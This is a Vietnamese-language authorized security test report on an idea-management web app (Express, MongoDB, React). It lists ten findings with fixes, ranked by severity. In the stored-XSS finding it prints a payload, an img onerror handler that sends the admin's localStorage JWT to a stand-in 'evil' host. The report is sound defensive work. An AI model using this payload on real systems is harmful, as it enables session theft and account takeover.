# Báo cáo kiểm thử bảo mật — Hệ thống Quản lý Ý tưởng (VICO Idea Management)

- **Phạm vi:** Source code white-box (`backend/` Express + MongoDB, `src/` React) và recon host `idea.ducthangloi.com`.
- **Ngày:** 2026-09-08 · **Loại:** Kiểm thử được ủy quyền (hệ thống của chủ sở hữu).
- **Stack:** React SPA + Express 4 + Mongoose 7 (MongoDB) + JWT (HS256) + multer + xlsx + nodemailer, sau nginx reverse proxy.

## Tóm tắt điều hành

Backend đã được hardening đáng kể trong lần rà trước (đã vá: bỏ tạo admin công khai, ép `JWT_SECRET`,
lỗi login chung chung, whitelist chống mass assignment, `escapeRegExp` chống ReDoS, `ideaCode` ngẫu nhiên,
chặn NoSQL injection ở login). Tuy nhiên còn **1 lỗ hổng Cao** (stored XSS dẫn tới chiếm tài khoản admin)
và một số vấn đề Trung bình/Thấp cần xử lý.

| # | Vấn đề | Mức độ |
|---|--------|--------|
| 1 | Stored XSS → chiếm tài khoản admin (xuất PDF báo cáo A3) | 🔴 Cao |
| 2 | HTML injection vào email thông báo cho admin | 🟠 Trung bình |
| 3 | Lộ PII + dữ liệu tài chính qua `GET /api/ideas/public` (không cần auth) | 🟠 Trung bình |
| 4 | Thư viện `xlsx@0.18.5` có CVE (prototype pollution / ReDoS) | 🟠 Trung bình |
| 5 | Thiếu security header trên site thật + lệch cấu hình nginx (không HTTPS redirect, CSP yếu) | 🟠 Trung bình |
| 6 | JWT lưu ở `localStorage` (bị đánh cắp nếu có XSS) | 🟡 Thấp |
| 7 | Không có phân quyền vai trò — mọi tài khoản đăng nhập là toàn quyền | 🟡 Thấp |
| 8 | Tin `x-forwarded-host` khi dựng URL tài sản | 🟡 Thấp |
| 9 | Lộ thông tin: `/api/health`, header `X-Powered-By: Express` | 🟡 Thấp |
| 10 | Rate limit trong bộ nhớ, chỉ theo IP (không chống credential stuffing đa IP) | 🟡 Thấp |

---

## 🔴 [1] Stored XSS → Chiếm tài khoản admin

**Vị trí:**
- `src/components/A3ReportForm.tsx` (dòng ~528–605, sink dòng ~622: `container.innerHTML = htmlContent`)
- `src/components/ExportReportDialog.tsx` (dòng ~440–466: cùng mẫu)
- Nguồn dữ liệu độc: `backend/src/controllers/ideaController.ts::createIdea` — **endpoint công khai** `POST /api/ideas`.

**Mô tả.** Template báo cáo A3 nhúng thẳng dữ liệu ý tưởng vào chuỗi HTML mà **không escape**:

```js
<div class="meta-row"><b>Người lập:</b>&nbsp;${idea.fullName || 'N/A'}</div>
<div class="meta-row"><b>Đơn vị:</b>&nbsp;${idea.department || 'N/A'}</div>
// ... reportTitle, idea.idea, idea.solution, idea.benefit ...
```

Chuỗi này được gán bằng `container.innerHTML = htmlContent`. Toàn bộ frontend **không có** hàm
`escapeHtml`/DOMPurify. Trình duyệt **không** chạy `<script>` chèn qua `innerHTML`, nhưng **có** chạy
handler sự kiện như `<img src=x onerror=...>`.

**Chuỗi khai thác.**
1. Kẻ tấn công (ẩn danh) gửi ý tưởng qua form công khai với `fullName` hoặc `department` =
   `<img src=x onerror="fetch('https://evil/?c='+localStorage.getItem('token'))">`.
2. Admin mở ý tưởng và bấm **Xuất báo cáo A3 (PDF)**.
3. `innerHTML` phân tích payload → `onerror` chạy trong trình duyệt admin →
   đọc JWT trong `localStorage` (xem `src/api/config.ts`) và gửi ra ngoài.
4. Kẻ tấn công dùng JWT → **toàn quyền admin** (do hệ thống chỉ có một cấp quyền, xem mục 7).

**Mức độ: Cao.** Không cần xác thực để chèn payload; hệ quả là chiếm tài khoản admin.

**Cách khắc phục.**
- Escape mọi dữ liệu người dùng trước khi ghép vào HTML template ở **cả hai** file:

```ts
// thêm tiện ích dùng chung, ví dụ src/utils/escapeHtml.ts
export const escapeHtml = (v: unknown): string =>
  String(v ?? '')
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#039;');
```

```js
// dùng trong template
<b>Người lập:</b>&nbsp;${escapeHtml(idea.fullName) || 'N/A'}
<b>Đơn vị:</b>&nbsp;${escapeHtml(idea.department) || 'N/A'}
// ...và reportTitle, idea.idea, solution, benefit, các *Text
```

- Phòng vệ chiều sâu: cân nhắc `DOMPurify.sanitize(htmlContent)` trước khi gán `innerHTML`.
- Kết hợp mục 6 (đưa JWT ra khỏi `localStorage`) để dù còn sót XSS cũng không đánh cắp được token.

---

## 🟠 [2] HTML injection vào email thông báo admin

**Vị trí:** `backend/src/services/emailService.ts` (hàm `sendIdeaSubmittedEmail`).

**Mô tả.** `idea.idea` được escape, nhưng `idea.department` và `idea.fullName` **không escape** khi
ghép vào HTML email:

```js
${idea.fullName ? `<p><strong>Họ và tên:</strong> ${idea.fullName}</p>` : ''}
<p><strong>Phòng ban:</strong> ${idea.department}</p>
```

Do `createIdea` công khai, kẻ tấn công chèn HTML (link giả mạo, nội dung lừa đảo) vào email gửi cho admin.

**Mức độ: Trung bình** (client email thường chặn script, nhưng cho phép phishing/nội dung giả).

**Khắc phục.** Dùng `escapeHtml` sẵn có trong file cho **mọi** trường: `escapeHtml(idea.department)`,
`escapeHtml(idea.fullName)`.

---

## 🟠 [3] Lộ PII + dữ liệu tài chính qua endpoint công khai

**Vị trí:** `backend/src/routes/ideaRoutes.ts` — `GET /api/ideas/public` (không `auth`).

**Mô tả.** Trả về **toàn bộ** ý tưởng kèm `fullName`, `department`, `benefitValue`, `rewardAmount`,
`benefit`, `solution`... cho người dùng ẩn danh → lộ họ tên nhân viên, giá trị làm lợi và **tiền thưởng**.
Ngoài ra `GET /api/ideas/code/:ideaCode` và `/search` trả **nguyên bản ghi** (mọi field nội bộ). Điểm này
được giảm nhẹ vì `ideaCode` nay ngẫu nhiên 48-bit (khó dò), nhưng nếu mã bị lộ thì lộ toàn bộ record.

**Mức độ: Trung bình.**

**Khắc phục.**
- Nếu trang công khai chỉ cần hiển thị hạn chế: `.select()` bỏ `rewardAmount`, `benefitValue`, `fullName`
  (hoặc rút gọn tên), `note`, `reasonNote`.
- Với `/code/:ideaCode`, chỉ trả các trường cần cho người tra cứu, không trả nguyên document.
- Nếu dữ liệu vốn không dành cho public → chuyển các endpoint này vào sau `auth`.

---

## 🟠 [4] Thư viện `xlsx@0.18.5` có lỗ hổng đã biết

**Vị trí:** `backend/package.json` (`"xlsx": "^0.18.5"`); dùng ở `importController.ts:766` (`XLSX.read`).

**Mô tả.** Phiên bản trên npm có **CVE-2023-30533 (prototype pollution)** và **ReDoS (CVE-2024-22363)**.
Luồng import chỉ dành cho admin (`router.use(auth)`), nên bề mặt hẹp, nhưng phân tích file xlsx không tin cậy
bằng bản có lỗi vẫn rủi ro.

**Mức độ: Trung bình.**

**Khắc phục.**
- Nâng cấp SheetJS lên bản vá từ CDN chính chủ (npm không còn phát hành bản mới), hoặc chuyển sang `exceljs`.
- Khi xuất lỗi (`exportErrors`, `json_to_sheet`), tránh **formula injection**: nếu ô bắt đầu bằng
  `= + - @`, thêm dấu nháy đơn ở đầu trước khi ghi.

---

## 🟠 [5] Thiếu security header + lệch cấu hình nginx

**Quan sát.** Recon `https://idea.ducthangloi.com` cho thấy **không có** header nào: HSTS, CSP,
`X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`. Nhưng `nginx.conf` trong repo **lại có**
các header đó — file này nhắm `server_name 172.104.39.94` **cổng 80 (HTTP)**, tức **không phải** cấu hình
đang chạy trên site HTTPS thật → **config drift** (bản deploy khác bản trong repo).

Ngoài ra ngay trong `nginx.conf`:
- **Không có** block TLS 443 và **không** redirect HTTP→HTTPS.
- CSP dùng `'unsafe-inline'` (yếu, không chặn được inline script).
- Bẫy kế thừa `add_header`: các `location` con (khối regex static, `/uploads/`) có `add_header` riêng nên
  **mất** toàn bộ security header ở cấp `server` cho những đường dẫn đó.

**Mức độ: Trung bình.**

**Khắc phục.**
- Đồng bộ cấu hình deploy với repo; thêm block 443 + redirect 80→443 + HSTS.
- Lặp lại các `add_header ... always;` trong **mỗi** `location` có `add_header` riêng (nginx không kế thừa).
- Siết CSP: bỏ `'unsafe-inline'`, chỉ `default-src 'self'` + nguồn cần thiết.
- Phòng vệ chiều sâu ở tầng ứng dụng: thêm `helmet` vào Express (`app.use(helmet())`), và
  `app.disable('x-powered-by')` (xem mục 9).

---

## 🟡 [6] JWT lưu trong `localStorage`

**Vị trí:** `src/api/config.ts` (đọc/ghi `localStorage` khóa `token`); backend cấp token ở
`authController.ts::login`.

**Mô tả.** Token trong `localStorage` bị JavaScript đọc được → bất kỳ XSS nào (mục 1) đều đánh cắp được,
dẫn tới ATO. Token HS256, hạn 24h, không có cơ chế thu hồi/refresh; `middleware/auth.ts` cũng không kiểm tra
người dùng còn tồn tại/không bị khóa.

**Mức độ: Thấp** (độc lập; trở thành đường leo thang khi kết hợp mục 1).

**Khắc phục.** Ưu tiên cookie `HttpOnly; Secure; SameSite=Strict` cho token (kèm chống CSRF), hoặc ít nhất
rút ngắn hạn token + thêm refresh/thu hồi. Cân nhắc kiểm tra user tồn tại trong `auth` middleware.

---

## 🟡 [7] Không có phân quyền vai trò

**Vị trí:** `backend/src/models/User.ts` (không có trường `role`); `middleware/auth.ts` chỉ xác thực token.

**Mô tả.** Mọi tài khoản đăng nhập đều làm được mọi hành động admin (xóa ý tưởng, import ghi đè, sửa tiền
thưởng...). Hiện chấp nhận được vì chỉ có tài khoản admin (tạo bằng CLI), nhưng rất dễ vỡ nếu sau này thêm
người dùng thường.

**Mức độ: Thấp (nợ thiết kế).**

**Khắc phục.** Thêm `role` vào `User`, middleware `requireRole('admin')` cho các route ghi/xóa/import.

---

## 🟡 [8] Tin `x-forwarded-host` khi dựng URL tài sản

**Vị trí:** `ideaController.ts`, `ideaRoutes.ts` (`/public`), `makeRoutes.ts` —
`req.get('host') || req.get('x-forwarded-host') || ...`.

**Mô tả.** `x-forwarded-host` do client kiểm soát; nếu dùng để dựng URL ảnh phản chiếu vào response
(hoặc email), có thể bị host-header injection. Rủi ro thấp do `req.get('host')` (nginx đặt) thường có sẵn.

**Khắc phục.** Dùng biến cấu hình cố định `PUBLIC_ASSET_BASE_URL` làm nguồn chuẩn; bỏ fallback theo header
client. Cấu hình `app.set('trust proxy', ...)` đã có — dựa vào đó thay vì đọc header thô.

---

## 🟡 [9] Lộ thông tin

- `GET /api/health` (`index.ts`) trả `db: connected` + `uptimeSeconds` cho ẩn danh → giảm bớt hoặc yêu cầu auth.
- Header `X-Powered-By: Express` → `app.disable('x-powered-by')` (hoặc dùng `helmet`).

**Mức độ: Thấp.**

---

## 🟡 [10] Rate limit trong bộ nhớ, chỉ theo IP

**Vị trí:** `backend/src/middleware/rateLimit.ts`.

**Mô tả.** Bộ đếm theo tiến trình — chạy nhiều instance (pm2 cluster/nhiều container) sẽ đếm rời rạc, giới
hạn thực nới ra nhiều lần. Login giới hạn theo IP (10/15 phút) nên credential stuffing từ nhiều IP vẫn lọt.

**Khắc phục.** Khi scale, chuyển store sang Redis. Cân nhắc thêm khóa theo tài khoản (không chỉ theo IP) cho
`/api/auth/login`, và CAPTCHA sau vài lần thất bại.

---

## ✅ Những điểm đã làm tốt (ghi nhận)

- Gỡ endpoint tạo admin công khai; tạo admin qua CLI.
- Ép `JWT_SECRET` (≥32 ký tự), không dùng giá trị mặc định (`config/secrets.ts`, `config/env.ts`).
- Login báo lỗi chung chung → không user enumeration; kiểm tra `typeof` chặn NoSQL injection.
- Rate limit đăng nhập 10 lần/15 phút.
- Whitelist `UPDATABLE_IDEA_FIELDS` chống mass assignment; `createIdea` destructure field cụ thể.
- `escapeRegExp` chống ReDoS/regex injection ở tìm kiếm.
- `ideaCode` ngẫu nhiên bằng `crypto.randomBytes` (không đoán được).
- Lưu file: sanitize tên file + `path.basename` → không path traversal.
- Route A3 và import đã bắt buộc `auth` (trước đây mở).
- CORS whitelist đúng (đã kiểm chứng qua recon: không reflect origin lạ / `null`).
- Error handler tập trung, ẩn stack trace; multer giới hạn 10MB; `makeAuth` dùng `timingSafeEqual`.

---

## Thứ tự ưu tiên xử lý

1. **[1] Stored XSS** — escape template A3 ở 2 file (khắc phục nhanh, tác động lớn nhất).
2. **[2] Email HTML injection** + **[3] Lộ dữ liệu public** — cùng nhóm dữ liệu nhạy cảm.
3. **[5] Security header/HTTPS** + **[9]** — cấu hình nginx & helmet.
4. **[4] Nâng xlsx** + **[6] JWT storage** + **[7] role** — cải thiện cấu trúc.
5. **[8], [10]** — hoàn thiện khi scale.
